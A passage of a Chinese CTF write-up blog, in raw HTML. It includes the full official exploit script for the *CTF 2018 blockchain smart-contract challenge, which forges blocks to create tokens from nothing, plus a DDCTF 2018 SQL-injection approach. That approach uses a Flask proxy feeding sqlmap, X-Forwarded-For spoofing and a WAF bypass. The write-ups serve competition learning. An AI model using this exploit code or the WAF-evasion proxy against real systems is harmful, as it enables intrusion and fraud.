class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line">    source.close()</span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">False</span>, host=<span class="string">'0.0.0.0'</span>, port=<span class="number">10012</span>)</span><br></pre></td></tr></table></figure><p>这道题目是从ddctf2018的区块链处改编的，由于不熟区块链和智能合约，看了好久，还是没真正看懂智能合约部分，所以，Orz。</p><p>良心的官方给了解答</p><p><a href="https://github.com/sixstars/starctf2018/tree/master/web-smart_contract" target="_blank" rel="noopener">https://github.com/sixstars/starctf2018/tree/master/web-smart_contract</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 2.7</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, json, hashlib, rsa, pickle, uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> server <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># do some modifications to the original one to remove 'session' variable and privkey</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_utxo</span><span class="params">(blocks, bankAddr, blockchain_tail)</span>:</span></span><br><span class="line">starToken_contract = SRC20SmartContract(bankAddr, <span class="number">0</span>)</span><br><span class="line">curr_block = blockchain_tail</span><br><span class="line">blockchain = [curr_block]</span><br><span class="line"><span class="keyword">while</span> curr_block[<span class="string">'height'</span>] != <span class="number">0</span>:</span><br><span class="line">curr_block = blocks[curr_block[<span class="string">'prev'</span>]]</span><br><span class="line">blockchain.append(curr_block)</span><br><span class="line">blockchain = blockchain[::<span class="number">-1</span>]</span><br><span class="line">utxos = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> block <span class="keyword">in</span> blockchain:</span><br><span class="line"><span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</span><br><span class="line"><span class="keyword">for</span> input_utxo_id <span class="keyword">in</span> tx[<span class="string">'input'</span>]:</span><br><span class="line"><span class="keyword">del</span> utxos[input_utxo_id]</span><br><span class="line"><span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</span><br><span class="line">utxos[utxo[<span class="string">'id'</span>]] = utxo</span><br><span class="line">starToken_contract.extractInfoFromUtxos(utxos)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'utxos = &#123;'</span></span><br><span class="line"><span class="keyword">for</span> utxo <span class="keyword">in</span> utxos:</span><br><span class="line"><span class="keyword">print</span>  json.dumps(utxo) + <span class="string">' : \n\t'</span> + json.dumps(utxos[utxo])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&#125;'</span></span><br><span class="line"><span class="keyword">return</span> utxos, starToken_contract</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==============</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_output_utxo</span><span class="params">(addr_to, amount)</span>:</span></span><br><span class="line">utxo = &#123;<span class="string">'id'</span>: str(uuid.uuid4()), <span class="string">'addr'</span>: addr_to, <span class="string">'amount'</span>: amount&#125;</span><br><span class="line">utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</span><br><span class="line"><span class="keyword">return</span> utxo</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_inner_str</span><span class="params">(haystack, st, ed=None)</span>:</span></span><br><span class="line">haystack = haystack[haystack.index(st)+len(st):]</span><br><span class="line"><span class="keyword">if</span> ed <span class="keyword">is</span> <span class="keyword">None</span>: <span class="keyword">return</span> haystack</span><br><span class="line"><span class="keyword">return</span> haystack[:haystack.index(ed)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">append_block</span><span class="params">(block)</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"block = \n\t"</span> + json.dumps(block)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[APPEND]'</span>, s.post(url_prefix+<span class="string">'/create_block'</span>, data=json.dumps(block),proxies=proxies).text</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n\n"</span></span><br><span class="line"></span><br><span class="line">is_first_time = <span class="keyword">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_blockchain</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> is_first_time</span><br><span class="line">ret = s.get(url_prefix+<span class="string">'/'</span>,proxies=proxies).text</span><br><span class="line"><span class="comment">#print ret.replace('&lt;br /&gt;','')</span></span><br><span class="line">tokens = json.loads(find_inner_str(ret, <span class="string">'StarTokens balance of all addresses: '</span>, <span class="string">'.'</span>))</span><br><span class="line">balance = json.loads(find_inner_str(ret, <span class="string">'StarCoins balance of all addresses: '</span>, <span class="string">'.'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'tokens = '</span> + json.dumps(tokens)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'balance = '</span> + json.dumps(balance)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> is_first_time:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[tokens = &#123;&#125;, balance = &#123;&#125;]'</span>.format(tokens.get(my_address, <span class="number">0</span>), balance[my_address])</span><br><span class="line">is_first_time = <span class="keyword">False</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'block trains = \n\t'</span> + find_inner_str(ret, <span class="string">'Blockchain Explorer: '</span>)</span><br><span class="line"><span class="keyword">return</span> ret, json.loads(find_inner_str(ret, <span class="string">'Blockchain Explorer: '</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redeem</span><span class="params">(bank_owned_utxo_id, tail, amount, nonce)</span>:</span></span><br><span class="line">output_to_get_starcoins = create_output_utxo(my_address, amount)</span><br><span class="line">tx = create_tx([bank_owned_utxo_id], [output_to_get_starcoins], my_privkey) <span class="comment"># my_privkey is dummy, the signature will be overwritten</span></span><br><span class="line">tx[<span class="string">'signature'</span>] = [] <span class="comment"># remains the field to be filled by smart contract</span></span><br><span class="line">tx[<span class="string">'call_smart_contract'</span>] = <span class="string">'withdraw'</span></span><br><span class="line">block = create_block(tail[<span class="string">'hash'</span>], nonce, [tx])</span><br><span class="line">append_block(block)</span><br><span class="line"><span class="keyword">return</span> output_to_get_starcoins</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buyTokens</span><span class="params">(utxoIdPaid, tail, amount, contractAddr, nonce)</span>:</span></span><br><span class="line">output_to_get_tokens = create_output_utxo(contractAddr, amount)</span><br><span class="line">tx = create_tx([utxoIdPaid], [output_to_get_tokens], my_privkey)</span><br><span class="line">tx[<span class="string">'call_smart_contract'</span>] = <span class="string">'buyTokens'</span></span><br><span class="line">block = create_block(tail[<span class="string">'hash'</span>], nonce, [tx])</span><br><span class="line">append_block(block)</span><br><span class="line"><span class="keyword">return</span> output_to_get_tokens</span><br><span class="line"></span><br><span class="line">url_prefix = <span class="string">'http://127.0.0.1:10012/6af948d659f0b7c5d3950a'</span></span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 100 starcoins</span></span><br><span class="line">resp, blocks = show_blockchain()</span><br><span class="line">my_address, my_privkey = find_inner_str(resp, <span class="string">'your addr: '</span>, <span class="string">','</span>), pickle.loads(find_inner_str(resp, <span class="string">'your privkey: '</span>, <span class="string">'.'</span>).decode(<span class="string">'hex'</span>))</span><br><span class="line">bankAddr = find_inner_str(resp, <span class="string">'the bank\'s addr: '</span>, <span class="string">','</span>)</span><br><span class="line"></span><br><span class="line">tail = find_blockchain_tail(blocks)</span><br><span class="line">utxos, contract = calculate_utxo(blocks, bankAddr, tail)</span><br><span class="line"><span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</span><br><span class="line"><span class="keyword">if</span> utxo[<span class="string">'addr'</span>] == my_address: my_utxo = utxo <span class="comment"># find the utxo of 100 starcoins </span></span><br><span class="line"><span class="keyword">if</span> utxo[<span class="string">'addr'</span>] == bankAddr: coinsIssued = utxo</span><br><span class="line">first100TokenBankOwned = buyTokens(my_utxo[<span class="string">'id'</span>], tail, <span class="number">100</span>, contract.addr, <span class="string">'step1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 100 tokens</span></span><br><span class="line">resp, blocks = show_blockchain()</span><br><span class="line">tail = find_blockchain_tail(blocks)</span><br><span class="line">utxos, contract = calculate_utxo(blocks, bankAddr, tail)</span><br><span class="line"><span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</span><br><span class="line"><span class="keyword">if</span> utxo[<span class="string">'addr'</span>] == my_address:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">my_first_100_tokens_utxo_id = utxo[<span class="string">'id'</span>]</span><br><span class="line">my_100_starcoins = redeem(first100TokenBankOwned[<span class="string">'id'</span>], tail, <span class="number">100</span>, <span class="string">'step2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 100 starcoins, 100 - 100 tokens</span></span><br><span class="line">resp, blocks = show_blockchain()</span><br><span class="line">tail = find_blockchain_tail(blocks)</span><br><span class="line">utxos, contract = calculate_utxo(blocks, bankAddr, tail)</span><br><span class="line"><span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</span><br><span class="line"><span class="keyword">if</span> utxo[<span class="string">'addr'</span>] == my_address <span class="keyword">and</span> utxo[<span class="string">'id'</span>] != my_first_100_tokens_utxo_id <span class="keyword">and</span> utxo[<span class="string">'amount'</span>] == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span> <span class="comment"># find the utxo of -100 tokens</span></span><br><span class="line">output_to_send_minus_100_token = create_output_utxo(bankAddr, <span class="number">0</span>)</span><br><span class="line">tx = create_tx([utxo[<span class="string">'id'</span>]], [output_to_send_minus_100_token], my_privkey)</span><br><span class="line">block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'step3'</span>, [tx])</span><br><span class="line">append_block(block)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 100 starcoins, 100 tokens, but the bank now just own a utxo of 200 starcoins, we need 200 tokens to redeem that utxo</span></span><br><span class="line">resp, blocks = show_blockchain()</span><br><span class="line">tail = find_blockchain_tail(blocks)</span><br><span class="line">buyTokens(my_100_starcoins[<span class="string">'id'</span>], tail, <span class="number">100</span>, contract.addr, <span class="string">'step4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 200 tokens to exchange the utxo of 200 starcoins owned by the bank initially</span></span><br><span class="line">resp, blocks = show_blockchain()</span><br><span class="line">tail = find_blockchain_tail(blocks)</span><br><span class="line">redeem(coinsIssued[<span class="string">'id'</span>], tail, <span class="number">200</span>, <span class="string">'step5'</span>)</span><br></pre></td></tr></table></figure><p>所以，这道题目的分析，准备从分析答案开始，回过头来分析源代码。</p><h4 id="分析流程"><a href="#分析流程" class="headerlink" title="分析流程"></a>分析流程</h4><p>首先，直接看答案源代码还是比较晕的，毕竟不知道他在干啥。</p><p>所以，我们先来加些log，看看整个获得flag的流程是怎样的。</p><p><img src="/img/starctf/1524491349.png" alt=""></p><p>用自己的钱，正常购买100token。</p><p><img src="/img/starctf/1524491525.png" alt=""></p><p>看起来像是正常提取100token，注意，要从不是tokenNum为100这里提取，这样提取后会有个tokenNum为-100的</p><p><img src="/img/starctf/1524491617.png" alt=""></p><p>注意到回到了tokens为0(100 + -100 = 0)，balance为100的局面，仿佛一切回到了原点，</p><p>哦？是吗</p><p><img src="/img/starctf/1524491899.png" alt=""></p><p>这是我们的地址，从这里转0个币（amount = 0）到银行，</p><p>这里就导致了一个不守恒，原则上，应该对于一个区块来说，input和output的总额应该是相等的，但是，由于这里将token储存在到<code>extra</code>数据域中，那么这个<code>tokenNum=-100</code>就会因这次的操作而消失(导致了所谓的不守恒)，即不会参与到后面的计算中，那么账户中多了100个token。</p><p>即，原来的<code>utxos</code>中包括了两个存有<code>extra</code>数据的<code>utxo</code>，分别记录了<code>tokenNum=100</code>和<code>tokenNum=-100</code>，计算你的<code>tokens</code>值时，会将他们求总和，即<code>100 + -100 = 0</code>。</p><p>后面，我们通过转账0个币给银行，导致存储着<code>tokenNum = -100</code>的<code>utxo</code>被使用了，其中存储的<code>tokenNum = -100</code>也就不会再参与计算你的<code>tokens</code>值，那么，计算你的<code>tokens</code>时，求总和，即<code>100 = 100</code>，此时，你的tokens为100。</p><p><img src="/img/starctf/1524492049.png" alt=""></p><p>嗯，然后进行正常的操作将tokens转成balance即可</p><p><img src="/img/starctf/1524492258.png" alt=""></p><p><img src="/img/starctf/1524492295.png" alt=""></p><p>这样下来，整个流程我们就清楚啦。</p><h4 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h4><p>首先分析，整个-100是怎么产生的，</p><p><img src="/img/starctf/1524493465.png" alt=""></p><p>在withdraw时，这里<code>amount = -amount</code> ，这是什么操作？意义是？当时看到这里我就一直在迷。</p><p>再来看，当<code>tokenNum</code>为-100时，转账<code>amount = 0</code>时，导致我们tokens增加100。</p><p><img src="/img/starctf/1524497481.png" alt=""></p><p>被引用过的就不会加入到<code>utxo</code>的计算中了。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ddctf-ctf-2018</title>
      <link href="//blog/2018/ddctf-ctf-2018.html"/>
      <url>//blog/2018/ddctf-ctf-2018.html</url>
      
        <content type="html"><![CDATA[<h3 id="Web1-数据库的秘密"><a href="#Web1-数据库的秘密" class="headerlink" title="Web1 数据库的秘密"></a>Web1 数据库的秘密</h3><p><img src="/img/ddctf/1.png" alt=""></p><p>很容易想到伪造XFF</p><p><img src="/img/ddctf/2.png" alt=""></p><p>接下来就是注入了。</p><p>首先，我们发现有个校验</p><p><img src="/img/ddctf/3.png" alt=""></p><p>然后，看了下js，貌似有点复杂，这里采用</p><p>sqlmap+python代理服务器（代理服务器处理校验的代码，通过python的execjs模块调用js代码）</p><p>后又遇到了安全狗，使用<code>from-data</code>提交数据，达到绕过</p><p>代理服务器main.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,request</span><br><span class="line">import requests</span><br><span class="line">import execjs</span><br><span class="line">import urllib</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_js():</span><br><span class="line">f = open(&quot;./crc.js&quot;, &apos;r&apos;)#, encoding=&apos;UTF-8&apos;)</span><br><span class="line">line = f.readline()</span><br><span class="line">htmlstr = &apos;&apos;</span><br><span class="line">while line:</span><br><span class="line">htmlstr = htmlstr + line</span><br><span class="line">line = f.readline()</span><br><span class="line">return htmlstr</span><br><span class="line"></span><br><span class="line">jsstr = get_js()</span><br><span class="line">ctx = execjs.compile(jsstr)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    id = request.args.get(&apos;id&apos;)</span><br><span class="line">    title = request.args.get(&apos;title&apos;)</span><br><span class="line">    date = request.args.get(&apos;date&apos;)</span><br><span class="line">    author = request.args.get(&apos;author&apos;)</span><br><span class="line">    print request.args.items().__str__()</span><br><span class="line">    crc_str = ctx.call(&apos;submitgg&apos;, id, title, date, author)</span><br><span class="line">    print crc_str</span><br><span class="line">    url = &quot;http://116.85.43.88:8080/PEQFGTUTQMZWCZGK/dfe3ia/&quot; + crc_str</span><br><span class="line">    # data = &#123;</span><br><span class="line">    #     &apos;id&apos;:id,</span><br><span class="line">    #     &apos;title&apos;:title,</span><br><span class="line">    #     &apos;date&apos;:date,</span><br><span class="line">    #     &apos;author&apos;:author,</span><br><span class="line">    # &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        &apos;id&apos;:id,</span><br><span class="line">        &apos;title&apos;:title,</span><br><span class="line">        &apos;date&apos;:date,</span><br><span class="line">        &apos;author&apos;:author,</span><br><span class="line">    &#125;</span><br><span class="line">    print data</span><br><span class="line">    files = &#123;</span><br><span class="line">        &apos;button&apos;: &apos;search&apos;,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        r = requests.post(url=url, headers=&#123;&quot;X-Forwarded-For&quot;: &quot;123.232.23.245&quot;&#125;, data=data, files=files)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print e</span><br><span class="line">        return e</span><br><span class="line">    return r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure><p>crc.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A JavaScript implementation of the Secure Hash Algorithm, SHA-1, as defined</span></span><br><span class="line"><span class="comment"> * in FIPS PUB 180-1</span></span><br><span class="line"><span class="comment"> * Version 2.1-BETA Copyright Paul Johnston 2000 - 2002.</span></span><br><span class="line"><span class="comment"> * Other contributors: Greg Holt, Andrew Kepert, Ydnar, Lostinet</span></span><br><span class="line"><span class="comment"> * Distributed under the BSD License</span></span><br><span class="line"><span class="comment"> * See http://pajhome.org.uk/crypt/md5 for details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Configurable variables. You may need to tweak these to be compatible with</span></span><br><span class="line"><span class="comment"> * the server-side, but the defaults work in most cases.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> hexcase = <span class="number">0</span>; <span class="comment">/* hex output format. 0 - lowercase; 1 - uppercase     */</span></span><br><span class="line"><span class="keyword">var</span> b64pad = <span class="string">""</span>; <span class="comment">/* base-64 pad character. "=" for strict RFC compliance  */</span></span><br><span class="line"><span class="keyword">var</span> chrsz = <span class="number">8</span>; <span class="comment">/* bits per input character. 8 - ASCII; 16 - Unicode    */</span></span><br><span class="line"><span class="keyword">var</span> key=<span class="string">"\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * These are the functions you'll usually want to call</span></span><br><span class="line"><span class="comment"> * They take string arguments and return either hex or base-64 encoded strings</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex_math_enc</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> binb2hex(core_math_enc(str2binb(s), s.length * chrsz));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b64_math_enc</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> binb2b64(core_math_enc(str2binb(s), s.length * chrsz));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_math_enc</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> binb2str(core_math_enc(str2binb(s), s.length * chrsz));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex_hmac_math_enc</span>(<span class="params">key, data</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> binb2hex(core_hmac_math_enc(key, data));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b64_hmac_math_enc</span>(<span class="params">key, data</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> binb2b64(core_hmac_math_enc(key, data));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_hmac_math_enc</span>(<span class="params">key, data</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> binb2str(core_hmac_math_enc(key, data));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Perform a simple self-test to see if the VM is working</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">math_enc_vm_test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> hex_math_enc(<span class="string">"abc"</span>) == <span class="string">"a9993e364706816aba3e25717850c26c9cd0d89d"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Calculate the SHA-1 of an array of big-endian words, and a bit length</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">core_math_enc</span>(<span class="params">x, len</span>) </span>&#123;</span><br><span class="line"> <span class="comment">/* append padding */</span></span><br><span class="line"> x[len &gt;&gt; <span class="number">5</span>] |= <span class="number">0x80</span> 